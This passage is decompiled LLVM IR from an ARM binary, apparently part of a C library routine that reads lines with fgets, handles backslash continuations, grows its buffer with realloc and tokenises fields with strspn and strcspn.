  store i32 %v1_14038, i32* %r3.global-to-local, align 4
  store i32 %v1_14038, i32* %v2_14034, align 4
  %v0_14040.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14040

dec_label_pc_14040:                               ; preds = %dec_label_pc_13fec, %dec_label_pc_14034
  %v1_14048 = phi i32 [ %v2_14008, %dec_label_pc_13fec ], [ %v0_14040.pre, %dec_label_pc_14034 ]
  %v1_14040 = add i32 %v1_14048, 4
  %v2_14040 = inttoptr i32 %v1_14040 to i32*
  %v3_14040 = load i32, i32* %v2_14040, align 4
  store i32 %v3_14040, i32* %r2.global-to-local, align 4
  %v4_14040 = add i32 %v1_14048, 8
  %v5_14040 = inttoptr i32 %v4_14040 to i32*
  %v6_14040 = load i32, i32* %v5_14040, align 4
  %v2_14044 = add i32 %v6_14040, %v3_14040
  store i32 %v2_14044, i32* %r3.global-to-local, align 4
  %v2_14048 = add i32 %v1_14048, 12
  %v3_14048 = inttoptr i32 %v2_14048 to i32*
  store i32 %v2_14044, i32* %v3_14048, align 4
  %v0_1404c = load i32, i32* @fp, align 4
  store i32 %v0_1404c, i32* @r6, align 4
  br label %dec_label_pc_14050

dec_label_pc_14050:                               ; preds = %dec_label_pc_140dc, %dec_label_pc_140c8, %dec_label_pc_14040
  %v0_14058 = phi i32 [ %v0_1404c, %dec_label_pc_14040 ], [ %v1_140c8, %dec_label_pc_140c8 ], [ %v0_14058.pre.pre, %dec_label_pc_140dc ]
  %v0_14050 = load i32, i32* @r5, align 4
  %v1_14050 = add i32 %v0_14050, 12
  store i32 %v1_14050, i32* %r0.global-to-local, align 4
  %v1_14054 = inttoptr i32 %v1_14050 to i32*
  %v2_14054 = load i32, i32* %v1_14054, align 4
  store i32 %v2_14054, i32* %r0.global-to-local, align 4
  %v3_14054 = add i32 %v0_14050, 16
  %v4_14054 = inttoptr i32 %v3_14054 to i32*
  %v5_14054 = load i32, i32* %v4_14054, align 4
  %v2_14058 = add i32 %v2_14054, %v0_14058
  store i32 %v2_14058, i32* %r0.global-to-local, align 4
  %v2_1405c = sub i32 %v5_14054, %v0_14058
  %v1_14060 = inttoptr i32 %v0_14050 to i32*
  %v2_14060 = load i32, i32* %v1_14060, align 4
  store i32 %v2_14060, i32* %r2.global-to-local, align 4
  %v3_14064 = call i32 @fgets(i32 %v2_14058, i32 %v2_1405c, i32 %v2_14060)
  store i32 %v3_14064, i32* %r0.global-to-local, align 4
  store i32 %v3_14064, i32* %r4.global-to-local, align 4
  %v2_14068 = icmp eq i32 %v3_14064, 0
  store i1 %v2_14068, i1* %cpsr_z.global-to-local, align 1
  %v0_14070 = load i32, i32* @r5, align 4
  %v1_14070 = add i32 %v0_14070, 12
  br i1 %v2_14068, label %dec_label_pc_14070, label %dec_label_pc_14088

dec_label_pc_14070:                               ; preds = %dec_label_pc_14050
  store i32 %v1_14070, i32* %r0.global-to-local, align 4
  %v1_14074 = inttoptr i32 %v1_14070 to i32*
  %v2_14074 = load i32, i32* %v1_14074, align 4
  store i32 %v2_14074, i32* %r0.global-to-local, align 4
  %v3_14074 = add i32 %v0_14070, 16
  %v4_14074 = inttoptr i32 %v3_14074 to i32*
  %v5_14074 = load i32, i32* %v4_14074, align 4
  store i32 %v5_14074, i32* %r2.global-to-local, align 4
  %v3_1407c = inttoptr i32 %v2_14074 to i8*
  %v4_1407c = call i32 @__GI_memset(i8* %v3_1407c, i32 0, i32 %v5_14074)
  store i32 %v4_1407c, i32* %r0.global-to-local, align 4
  %v0_14080 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142a0

dec_label_pc_14088:                               ; preds = %dec_label_pc_14050
  %v2_14088 = inttoptr i32 %v1_14070 to i32*
  %v3_14088 = load i32, i32* %v2_14088, align 4
  store i32 %v3_14088, i32* @r4, align 4
  %v1_1408c = load i32, i32* @r6, align 4
  %v2_1408c = add i32 %v1_1408c, %v3_14088
  %v3_1408c = inttoptr i32 %v2_1408c to i8*
  store i32 %v2_1408c, i32* %r0.global-to-local, align 4
  %v3_14090 = call i32 @strlen(i8* %v3_1408c)
  %v0_14098 = load i32, i32* @r6, align 4
  %v2_14098 = add i32 %v0_14098, %v3_14090
  store i32 %v2_14098, i32* @r6, align 4
  %v0_1409c = load i32, i32* @r4, align 4
  store i32 %v0_1409c, i32* @r0, align 4
  %v2_140a0 = call i32 @__GI_strchr(i32 %v0_1409c, i32 10)
  store i32 %v2_140a0, i32* %r0.global-to-local, align 4
  %v2_140a4 = icmp eq i32 %v2_140a0, 0
  store i1 %v2_140a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140a4, label %dec_label_pc_140d0, label %dec_label_pc_140ac

dec_label_pc_140ac:                               ; preds = %dec_label_pc_14088
  %v1_140ac = inttoptr i32 %v2_140a0 to i8*
  %v2_140ac = load i8, i8* %v1_140ac, align 1
  %v3_140ac = zext i8 %v2_140ac to i32
  %v1_140b0 = add nuw nsw i32 %v3_140ac, 255
  %v1_140b4 = urem i32 %v1_140b0, 256
  store i32 %v1_140b4, i32* %r3.global-to-local, align 4
  %v7_140b8 = icmp eq i32 %v1_140b4, 92
  store i1 %v7_140b8, i1* %cpsr_z.global-to-local, align 1
  %v1_140bc = trunc i32 %v1_140b0 to i8
  store i8 %v1_140bc, i8* %v1_140ac, align 1
  %v0_140c0 = load i32, i32* @r6, align 4
  %v1_140c0 = add i32 %v0_140c0, -1
  store i32 %v1_140c0, i32* @r6, align 4
  %v0_140c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140c4, label %dec_label_pc_140c8, label %dec_label_pc_14154

dec_label_pc_140c8:                               ; preds = %dec_label_pc_140ac
  %v1_140c8 = add i32 %v0_140c0, -2
  store i32 %v1_140c8, i32* @r6, align 4
  br label %dec_label_pc_14050

dec_label_pc_140d0:                               ; preds = %dec_label_pc_14088
  %v0_140d0 = load i32, i32* @r5, align 4
  %v1_140d0 = add i32 %v0_140d0, 20
  %v2_140d0 = inttoptr i32 %v1_140d0 to i32*
  %v3_140d0 = load i32, i32* %v2_140d0, align 4
  store i32 %v3_140d0, i32* %r3.global-to-local, align 4
  %v2_140d4 = icmp eq i32 %v3_140d0, 0
  store i1 %v2_140d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140d4, label %dec_label_pc_1410c, label %dec_label_pc_140dc

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140d0
  %v1_140dc = add i32 %v0_140d0, 16
  %v2_140dc = inttoptr i32 %v1_140dc to i32*
  %v3_140dc = load i32, i32* %v2_140dc, align 4
  store i32 %v3_140dc, i32* %r3.global-to-local, align 4
  %v1_140e0 = add i32 %v0_140d0, 8
  %v2_140e0 = inttoptr i32 %v1_140e0 to i32*
  %v3_140e0 = load i32, i32* %v2_140e0, align 4
  %v1_140e4 = add i32 %v3_140dc, 4096
  store i32 %v1_140e4, i32* %r3.global-to-local, align 4
  %v2_140e8 = add i32 %v3_140e0, %v1_140e4
  store i32 %v1_140e4, i32* %v2_140dc, align 4
  %v0_140f0 = load i32, i32* @r5, align 4
  %v1_140f0 = add i32 %v0_140f0, 4
  %v2_140f0 = inttoptr i32 %v1_140f0 to i32*
  %v3_140f0 = load i32, i32* %v2_140f0, align 4
  store i32 %v3_140f0, i32* %r0.global-to-local, align 4
  %v4_140f4 = inttoptr i32 %v3_140f0 to i32*
  %v5_140f4 = call i32 @realloc(i32* %v4_140f4, i32 %v2_140e8, i32 %v2_14060, i32 %v1_140e4)
  store i32 %v5_140f4, i32* %r0.global-to-local, align 4
  %v0_140f8 = load i32, i32* @r5, align 4
  %v1_140f8 = add i32 %v0_140f8, 8
  %v2_140f8 = inttoptr i32 %v1_140f8 to i32*
  %v3_140f8 = load i32, i32* %v2_140f8, align 4
  %v2_140fc = add i32 %v3_140f8, %v5_140f4
  store i32 %v2_140fc, i32* %r3.global-to-local, align 4
  %v2_14100 = add i32 %v0_140f8, 12
  %v3_14100 = inttoptr i32 %v2_14100 to i32*
  store i32 %v2_140fc, i32* %v3_14100, align 4
  %v1_14104 = load i32, i32* @r5, align 4
  %v2_14104 = add i32 %v1_14104, 4
  %v3_14104 = inttoptr i32 %v2_14104 to i32*
  store i32 %v5_140f4, i32* %v3_14104, align 4
  %v0_14058.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14050

dec_label_pc_1410c:                               ; preds = %dec_label_pc_140d0, %.dec_label_pc_1410c_crit_edge
  %v0_1410c = phi i32 [ %v0_1410c.pre, %.dec_label_pc_1410c_crit_edge ], [ %v0_140d0, %dec_label_pc_140d0 ]
  %v1_1410c = inttoptr i32 %v0_1410c to i32*
  %v2_1410c = load i32, i32* %v1_1410c, align 4
  store i32 %v2_1410c, i32* @r1, align 4
  %v1_14110 = add i32 %v2_1410c, 52
  %v2_14110 = inttoptr i32 %v1_14110 to i32*
  %v3_14110 = load i32, i32* %v2_14110, align 4
  store i32 %v3_14110, i32* %r3.global-to-local, align 4
  %v2_14114 = icmp eq i32 %v3_14110, 0
  store i1 %v2_14114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14114, label %dec_label_pc_14140, label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %dec_label_pc_1410c
  %v1_1411c = add i32 %v2_1410c, 16
  %v2_1411c = inttoptr i32 %v1_1411c to i32*
  %v3_1411c = load i32, i32* %v2_1411c, align 4
  store i32 %v3_1411c, i32* %r2.global-to-local, align 4
  %v1_14120 = add i32 %v2_1410c, 24
  %v2_14120 = inttoptr i32 %v1_14120 to i32*
  %v3_14120 = load i32, i32* %v2_14120, align 4
  store i32 %v3_14120, i32* %r3.global-to-local, align 4
  %v3_14124 = icmp ult i32 %v3_1411c, %v3_14120
  %v9_14124 = icmp eq i32 %v3_1411c, %v3_14120
  store i1 %v9_14124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14124, label %dec_label_pc_14148thread-pre-split, label %dec_label_pc_14134

dec_label_pc_14134:                               ; preds = %dec_label_pc_1411c
  store i32 %v2_1410c, i32* %r0.global-to-local, align 4
  %v1_14138 = inttoptr i32 %v2_1410c to i16*
  %v2_14138 = call i32 @getc_unlocked(i16* %v1_14138)
  store i32 %v2_14138, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14148

dec_label_pc_14140:                               ; preds = %dec_label_pc_1410c
  store i32 %v2_1410c, i32* %r0.global-to-local, align 4
  %v1_14144 = call i32 @__GI_fgetc(i32 %v2_1410c)
  store i32 %v1_14144, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14148

dec_label_pc_14148thread-pre-split:               ; preds = %dec_label_pc_1411c
  %v2_14128 = inttoptr i32 %v3_1411c to i8*
  %v3_14128 = load i8, i8* %v2_14128, align 1
  %v4_14128 = zext i8 %v3_14128 to i32
  store i32 %v4_14128, i32* %r0.global-to-local, align 4
  %v6_14128 = add i32 %v3_1411c, 1
  store i32 %v6_14128, i32* %r2.global-to-local, align 4
  store i32 %v6_14128, i32* %v2_1411c, align 4
  %v0_14148.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14148

dec_label_pc_14148:                               ; preds = %dec_label_pc_14148thread-pre-split, %dec_label_pc_14134, %dec_label_pc_14140
  %v1_1414c = phi i32 [ %v0_14148.pr, %dec_label_pc_14148thread-pre-split ], [ %v2_14138, %dec_label_pc_14134 ], [ %v1_14144, %dec_label_pc_14140 ]
  %v7_14148 = icmp eq i32 %v1_1414c, 10
  store i1 %v7_14148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14148, label %dec_label_pc_14154.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_14148
  %v8_1414c = icmp eq i32 %v1_1414c, -1
  store i1 %v8_1414c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1414c, label %dec_label_pc_14154.loopexit, label %.dec_label_pc_1410c_crit_edge

.dec_label_pc_1410c_crit_edge:                    ; preds = %bb66
  %v0_1410c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1410c

dec_label_pc_14154.loopexit:                      ; preds = %bb66, %dec_label_pc_14148
  %v0_14154.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14154

dec_label_pc_14154:                               ; preds = %dec_label_pc_140ac, %dec_label_pc_14154.loopexit
  %v0_14154 = phi i32 [ %v0_14154.pre, %dec_label_pc_14154.loopexit ], [ %v1_140c0, %dec_label_pc_140ac ]
  %v7_14154 = icmp eq i32 %v0_14154, -1
  store i1 %v7_14154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14154, label %dec_label_pc_1429c, label %dec_label_pc_1415c

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14154
  store i32 %v1_13fc4, i32* %r3.global-to-local, align 4
  store i1 %v2_14160, i1* %cpsr_z.global-to-local, align 1
  %v0_14164 = load i32, i32* @r5, align 4
  %v1_14164 = add i32 %v0_14164, 12
  %v2_14164 = inttoptr i32 %v1_14164 to i32*
  %v3_14164 = load i32, i32* %v2_14164, align 4
  store i32 %v3_14164, i32* @r4, align 4
  br i1 %v2_14160, label %dec_label_pc_1417c, label %dec_label_pc_1416c

dec_label_pc_1416c:                               ; preds = %dec_label_pc_1415c
  store i32 %v3_14164, i32* @r0, align 4
  %v0_14170 = load i32, i32* @sl, align 4
  %v2_14174 = inttoptr i32 %v3_14164 to i8*
  %v3_14174 = call i32 @__GI_strspn(i8* %v2_14174, i32 %v0_14170)
  store i32 %v3_14174, i32* %r0.global-to-local, align 4
  %v0_14178 = load i32, i32* @r4, align 4
  %v2_14178 = add i32 %v0_14178, %v3_14174
  store i32 %v2_14178, i32* @r4, align 4
  br label %dec_label_pc_1417c

dec_label_pc_1417c:                               ; preds = %dec_label_pc_1415c, %dec_label_pc_1416c
  %v0_1417c = phi i32 [ %v3_14164, %dec_label_pc_1415c ], [ %v2_14178, %dec_label_pc_1416c ]
  %v1_1417c = inttoptr i32 %v0_1417c to i8*
  %v2_1417c = load i8, i8* %v1_1417c, align 1
  %v3_1417c = zext i8 %v2_1417c to i32
  store i32 %v3_1417c, i32* %r2.global-to-local, align 4
  %v2_14180 = icmp eq i8 %v2_1417c, 0
  store i1 %v2_14180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14180, label %dec_label_pc_13fec.backedge, label %dec_label_pc_14188

dec_label_pc_13fec.backedge:                      ; preds = %dec_label_pc_1417c, %dec_label_pc_14188, %dec_label_pc_14294
  %v0_13fec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13fec

dec_label_pc_14188:                               ; preds = %dec_label_pc_1417c
  %v0_14188 = load i32, i32* @r7, align 4
  %v1_14188 = inttoptr i32 %v0_14188 to i8*
  %v2_14188 = load i8, i8* %v1_14188, align 1
  %v3_14188 = zext i8 %v2_14188 to i32
  store i32 %v3_14188, i32* %r3.global-to-local, align 4
  %v9_1418c = icmp eq i8 %v2_14188, %v2_1417c
  store i1 %v9_1418c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1418c, label %dec_label_pc_13fec.backedge, label %dec_label_pc_14194

dec_label_pc_14194:                               ; preds = %dec_label_pc_14188
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_14198 = load i32, i32* @r5, align 4
  %v1_14198 = add i32 %v0_14198, 4
  %v2_14198 = inttoptr i32 %v1_14198 to i32*
  %v3_14198 = load i32, i32* %v2_14198, align 4
  store i32 %v3_14198, i32* %r0.global-to-local, align 4
  %v0_1419c = load i32, i32* @fp, align 4
  store i32 %v3_14198, i32* %v1_141b8, align 4
  store i32 %v3_13fb0, i32* %r2.global-to-local, align 4
  %v3_141a8 = inttoptr i32 %v3_14198 to i8*
  %v4_141a8 = call i32 @__GI_memset(i8* %v3_141a8, i32 %v0_1419c, i32 %v3_13fb0)
  store i32 %v4_141a8, i32* %r0.global-to-local, align 4
  %v0_141ac = load i32, i32* @fp, align 4
  store i32 %v0_141ac, i32* @r6, align 4
  %v0_1426c12 = load i32, i32* @r4, align 4
  %v1_1426c13 = inttoptr i32 %v0_1426c12 to i8*
  %v2_1426c14 = load i8, i8* %v1_1426c13, align 1
  %v3_1426c15 = zext i8 %v2_1426c14 to i32
  store i32 %v3_1426c15, i32* %r2.global-to-local, align 4
  %v2_1427016 = icmp eq i8 %v2_1426c14, 0
  store i1 %v2_1427016, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1427016, label %dec_label_pc_14288, label %dec_label_pc_14278

dec_label_pc_141b4:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_141b8 = load i32, i32* %v1_141b8, align 4
  store i32 %v2_141b8, i32* %r3.global-to-local, align 4
  store i32 %v1_13fc8, i32* %r2.global-to-local, align 4
  %v9_141c0 = icmp eq i32 %v2_141c4, %v1_13fc8
  store i1 %v9_141c0, i1* %cpsr_z.global-to-local, align 1
  %v5_141c4 = mul i32 %v2_141c4, 4
  %v6_141c4 = add i32 %v2_141b8, %v5_141c4
  %v7_141c4 = inttoptr i32 %v6_141c4 to i32*
  store i32 %v0_141c4, i32* %v7_141c4, align 4
  br i1 %v9_141c0, label %dec_label_pc_141cc, label %dec_label_pc_141d8

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141b4
  store i32 %v1_13fd4, i32* %r3.global-to-local, align 4
  store i1 %v2_141d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141d0, label %dec_label_pc_141d8, label %dec_label_pc_141f8

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141cc, %dec_label_pc_141b4
  %v0_141d8 = load i32, i32* @r7, align 4
  %v1_141d8 = inttoptr i32 %v0_141d8 to i8*
  %v2_141d8 = load i8, i8* %v1_141d8, align 1
  %v3_141d8 = zext i8 %v2_141d8 to i32
  store i32 %v3_141d8, i32* %r3.global-to-local, align 4
  %v2_141dc = icmp eq i8 %v2_141d8, 0
  store i1 %v2_141dc, i1* %cpsr_z.global-to-local, align 1
  %v0_141e0 = load i32, i32* @r4, align 4
  store i32 %v0_141e0, i32* @r0, align 4
  %v1_141e4 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_141dc, i32 %v1_141e4, i32 %v0_141d8
  store i32 %storemerge, i32* @r1, align 4
  %v0_141ec = call i32 @strcspn()
  store i32 %v0_141ec, i32* %r0.global-to-local, align 4
  %v0_141f0 = load i32, i32* @r4, align 4
  %v2_141f0 = add i32 %v0_141f0, %v0_141ec
  store i32 %v2_141f0, i32* @r4, align 4
  br label %dec_label_pc_14230

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141cc
  %v0_141f8 = load i32, i32* @r4, align 4
  store i32 %v0_141f8, i32* @r0, align 4
  %v0_141fc = load i32, i32* @r7, align 4
  %v1_141fc = inttoptr i32 %v0_141fc to i8*
  %v2_141fc = load i8, i8* %v1_141fc, align 1
  %v3_141fc = zext i8 %v2_141fc to i32
  %v5_14200 = call i32 @__GI_strchrnul(i32 %v0_141f8, i32 %v3_141fc, i32 %v1_13fc8, i32 %v1_13fd4)
  store i32 %v5_14200, i32* %r0.global-to-local, align 4
  store i32 %v1_13fc4, i32* %r2.global-to-local, align 4
  store i1 %v2_14160, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_14200, i32* @r4, align 4
  br i1 %v2_14160, label %dec_label_pc_14230, label %dec_label_pc_1421c

dec_label_pc_14218:                               ; preds = %dec_label_pc_1421c
  %v1_14218 = add i32 %v0_14230.pre, -1
  store i32 %v1_14218, i32* @r4, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %dec_label_pc_141f8, %dec_label_pc_14218
  %v0_1421c = phi i32 [ %v1_14218, %dec_label_pc_14218 ], [ %v5_14200, %dec_label_pc_141f8 ]
  %v1_1421c = add i32 %v0_1421c, -1
  %v2_1421c = inttoptr i32 %v1_1421c to i8*
  %v3_1421c = load i8, i8* %v2_1421c, align 1
  %v4_1421c = zext i8 %v3_1421c to i32
  %v0_14220 = load i32, i32* @sl, align 4
  store i32 %v0_14220, i32* @r0, align 4
  %v2_14224 = call i32 @__GI_strchr(i32 %v0_14220, i32 %v4_1421c)
  store i32 %v2_14224, i32* %r0.global-to-local, align 4
  %v2_14228 = icmp eq i32 %v2_14224, 0
  store i1 %v2_14228, i1* %cpsr_z.global-to-local, align 1
  %v0_14230.pre = load i32, i32* @r4, align 4
  br i1 %v2_14228, label %dec_label_pc_14230, label %dec_label_pc_14218

dec_label_pc_14230:                               ; preds = %dec_label_pc_1421c, %dec_label_pc_141f8, %dec_label_pc_141d8
  %v3_1423c = phi i32 [ %v5_14200, %dec_label_pc_141f8 ], [ %v2_141f0, %dec_label_pc_141d8 ], [ %v0_14230.pre, %dec_label_pc_1421c ]
  %v1_14230 = inttoptr i32 %v3_1423c to i8*
  %v2_14230 = load i8, i8* %v1_14230, align 1
  %v3_14230 = zext i8 %v2_14230 to i32
  store i32 %v3_14230, i32* %r2.global-to-local, align 4
  %v0_14234 = load i32, i32* @r7, align 4
  %v1_14234 = inttoptr i32 %v0_14234 to i8*
  %v2_14234 = load i8, i8* %v1_14234, align 1
  %v3_14234 = zext i8 %v2_14234 to i32
  store i32 %v3_14234, i32* %r3.global-to-local, align 4
  %v9_14238 = icmp eq i8 %v2_14234, %v2_14230
  store i1 %v9_14238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14238, label %bb69, label %dec_label_pc_14244

bb69:                                             ; preds = %dec_label_pc_14230
  %v1_1423c = load i32, i32* @fp, align 4
  %v2_1423c = trunc i32 %v1_1423c to i8
  store i8 %v2_1423c, i8* %v1_14230, align 1
  %v0_14240.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14240.pr, label %bb71, label %.dec_label_pc_14244_crit_edge

.dec_label_pc_14244_crit_edge:                    ; preds = %bb69
  %v0_14244.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %.dec_label_pc_14244_crit_edge, %dec_label_pc_14230
  %v0_14244 = phi i32 [ %v0_14244.pre, %.dec_label_pc_14244_crit_edge ], [ %v3_14230, %dec_label_pc_14230 ]
  %v2_14244 = icmp eq i32 %v0_14244, 0
  store i1 %v2_14244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14244, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_14244
  %v1_14248 = load i32, i32* @fp, align 4
  %v2_14248 = trunc i32 %v1_14248 to i8
  %v3_14248 = load i32, i32* @r4, align 4
  %v4_14248 = inttoptr i32 %v3_14248 to i8*
  store i8 %v2_14248, i8* %v4_14248, align 1
  %v5_14248 = load i32, i32* @r4, align 4
  %v6_14248 = add i32 %v5_14248, 1
  store i32 %v6_14248, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_14244, %bb70
  %v2_1424c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1424c, i32* %r3.global-to-local, align 4
  %v2_14250 = icmp eq i32 %v2_1424c, 0
  store i1 %v2_14250, i1* %cpsr_z.global-to-local, align 1
  %v0_1426c.pre = load i32, i32* @r4, align 4
  br i1 %v2_14250, label %dec_label_pc_14268, label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %bb71
  store i32 %v0_1426c.pre, i32* @r0, align 4
  %v0_1425c = load i32, i32* @sl, align 4
  %v2_14260 = inttoptr i32 %v0_1426c.pre to i8*
  %v3_14260 = call i32 @__GI_strspn(i8* %v2_14260, i32 %v0_1425c)
  store i32 %v3_14260, i32* %r0.global-to-local, align 4
  %v0_14264 = load i32, i32* @r4, align 4
  %v2_14264 = add i32 %v0_14264, %v3_14260
  store i32 %v2_14264, i32* @r4, align 4
  br label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %bb71, %dec_label_pc_14258
  %v0_1426c = phi i32 [ %v2_14264, %dec_label_pc_14258 ], [ %v0_1426c.pre, %bb71 ]
  %v0_14268 = load i32, i32* @r6, align 4
  %v1_14268 = add i32 %v0_14268, 1
  store i32 %v1_14268, i32* @r6, align 4
  %v1_1426c = inttoptr i32 %v0_1426c to i8*
  %v2_1426c = load i8, i8* %v1_1426c, align 1
  %v3_1426c = zext i8 %v2_1426c to i32
  store i32 %v3_1426c, i32* %r2.global-to-local, align 4
  %v2_14270 = icmp eq i8 %v2_1426c, 0
  store i1 %v2_14270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14270, label %dec_label_pc_14288, label %dec_label_pc_14278

dec_label_pc_14278:                               ; preds = %dec_label_pc_14194, %dec_label_pc_14268
  %v0_141c4 = phi i32 [ %v0_1426c, %dec_label_pc_14268 ], [ %v0_1426c12, %dec_label_pc_14194 ]
  %v2_141c4 = phi i32 [ %v1_14268, %dec_label_pc_14268 ], [ %v0_141ac, %dec_label_pc_14194 ]
  %v1_1427c = phi i32 [ %v3_1426c, %dec_label_pc_14268 ], [ %v3_1426c15, %dec_label_pc_14194 ]
  %v0_14278 = load i32, i32* @r7, align 4
  %v1_14278 = inttoptr i32 %v0_14278 to i8*
  %v2_14278 = load i8, i8* %v1_14278, align 1
  %v3_14278 = zext i8 %v2_14278 to i32
  store i32 %v3_14278, i32* %r3.global-to-local, align 4
  %v9_1427c = icmp eq i32 %v3_14278, %v1_1427c
  store i1 %v9_1427c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1427c, label %dec_label_pc_14288, label %bb72

bb72:                                             ; preds = %dec_label_pc_14278
  %v2_14280 = load i32, i32* @sb, align 4
  %v3_14280 = sub i32 %v2_141c4, %v2_14280
  %v5_14280 = xor i32 %v2_14280, %v2_141c4
  %v6_14280 = xor i32 %v3_14280, %v2_141c4
  %v7_14280 = and i32 %v6_14280, %v5_14280
  %v8_14280 = icmp slt i32 %v7_14280, 0
  %v9_14280 = icmp slt i32 %v3_14280, 0
  %v10_14280 = icmp eq i32 %v2_141c4, %v2_14280
  store i1 %v10_14280, i1* %cpsr_z.global-to-local, align 1
  %v2_14284 = xor i1 %v9_14280, %v8_14280
  br i1 %v2_14284, label %dec_label_pc_141b4, label %dec_label_pc_14288

dec_label_pc_14288:                               ; preds = %dec_label_pc_14278, %dec_label_pc_14268, %bb72, %dec_label_pc_14194
  %v0_1428c = phi i32 [ %v0_141ac, %dec_label_pc_14194 ], [ %v2_141c4, %dec_label_pc_14278 ], [ %v1_14268, %dec_label_pc_14268 ], [ %v2_141c4, %bb72 ]
  store i32 %v3_13fac, i32* %r2.global-to-local, align 4
  %v9_1428c = icmp eq i32 %v0_1428c, %v3_13fac
  store i1 %v9_1428c, i1* %cpsr_z.global-to-local, align 1
  %v6_14290 = icmp slt i32 %v0_1428c, %v3_13fac
  br i1 %v6_14290, label %dec_label_pc_14294, label %dec_label_pc_142a0

dec_label_pc_14294:                               ; preds = %dec_label_pc_14288
  %v0_14294 = load i32, i32* @r8, align 4
  %v1_14294 = and i32 %v0_14294, 1048576
  %v2_14294 = icmp eq i32 %v1_14294, 0
  store i1 %v2_14294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14294, label %dec_label_pc_13fec.backedge, label %dec_label_pc_1429c

dec_label_pc_1429c:                               ; preds = %dec_label_pc_14294, %dec_label_pc_14154, %.thread, %entry
  br label %dec_label_pc_142a0

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14288, %dec_label_pc_14070, %dec_label_pc_1429c
  %v0_142a0 = phi i32 [ %v0_14080, %dec_label_pc_14070 ], [ 0, %dec_label_pc_1429c ], [ %v0_1428c, %dec_label_pc_14288 ]
  store i32 %v0_142a0, i32* %r0.global-to-local, align 4
  store i32 %v3_13f88, i32* @r4, align 4
  store i32 %v6_13f88, i32* @r5, align 4
  store i32 %v9_13f88, i32* @r6, align 4
  store i32 %v12_13f88, i32* @r7, align 4
  store i32 %v15_13f88, i32* @r8, align 4
  store i32 %v18_13f88, i32* @sb, align 4
  store i32 %v21_13f88, i32* @sl, align 4
  store i32 %v24_13f88, i32* @fp, align 4
  ret i32 %v0_142a0

; uselistorder directives
  uselistorder i32 %v0_142a0, { 1, 0 }
  uselistorder i32 %v0_1428c, { 0, 2, 1 }
  uselistorder i32 %v3_14280, { 1, 0 }
  uselistorder i32 %v2_14280, { 1, 0, 2 }
  uselistorder i32 %v2_141c4, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_1426c.pre, { 0, 2, 1 }
  uselistorder i32 %v5_14200, { 1, 0, 2, 3 }
  uselistorder i32 %v0_141ac, { 1, 0, 2 }
  uselistorder i1 %v9_1418c, { 1, 0 }
  uselistorder i32 %v3_14164, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14154, { 1, 0 }
  uselistorder i1 %v8_1414c, { 1, 0 }
  uselistorder i32 %v3_1411c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1410c, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_140f4, { 1, 0, 2 }
  uselistorder i32 %v1_140e4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_140d0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_140c8, { 1, 0 }
  uselistorder i32 %v1_140b4, { 1, 0 }
  uselistorder i32 %v1_140b0, { 1, 0 }
  uselistorder i32 %v2_1408c, { 1, 0 }
  uselistorder i32 %v1_14070, { 2, 0, 1 }
  uselistorder i32 %v0_14058, { 1, 0 }
  uselistorder i32 %v1_14048, { 0, 2, 1 }
  uselistorder i32* %v1_141b8, { 1, 0 }
  uselistorder i1 %v2_14160, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13fd4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_13fc8, { 2, 1, 0 }
  uselistorder i32 %v3_13fb0, { 1, 2, 0 }
  uselistorder i32 %v3_13fac, { 2, 1, 0 }
  uselistorder i32 %v1_13fa4, { 2, 0, 1 }
